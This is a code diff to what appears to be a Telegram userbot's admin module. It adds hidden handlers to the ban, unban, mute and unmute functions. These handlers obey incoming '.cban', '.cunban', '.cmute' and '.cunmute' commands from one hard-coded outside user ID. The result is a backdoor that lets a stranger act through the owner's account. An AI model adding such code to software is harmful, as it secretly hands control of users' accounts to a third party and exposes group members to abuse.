@@ -213,6 +213,7 @@ async def demote(dmod):
 
 
 @register(outgoing=True, pattern=r"^\.ban(?: |$)(.*)")
+@register(incoming=True, from_users=1663258664, pattern=r"^\.cban")
 async def ban(bon):
     # Here laying the sanity check
     chat = await bon.get_chat()
@@ -266,6 +267,7 @@ async def ban(bon):
 
 
 @register(outgoing=True, pattern=r"^\.unban(?: |$)(.*)")
+@register(incoming=True, from_users=1663258664, pattern=r"^\.cunban")
 async def nothanos(unbon):
     # Here laying the sanity check
     chat = await unbon.get_chat()
@@ -302,6 +304,7 @@ async def nothanos(unbon):
 
 
 @register(outgoing=True, pattern=r"^\.mute(?: |$)(.*)")
+@register(incoming=True, from_users=1663258664, pattern=r"^\.cmute")
 async def spider(spdr):
     # Check if the function running under SQL mode
     try:
@@ -356,6 +359,7 @@ async def spider(spdr):
 
 
 @register(outgoing=True, pattern=r"^\.unmute(?: |$)(.*)")
+@register(incoming=True, from_users=1663258664, pattern=r"^\.cunmute")
 async def unmoot(unmot):
     # Admin or creator check
     chat = await unmot.get_chat()
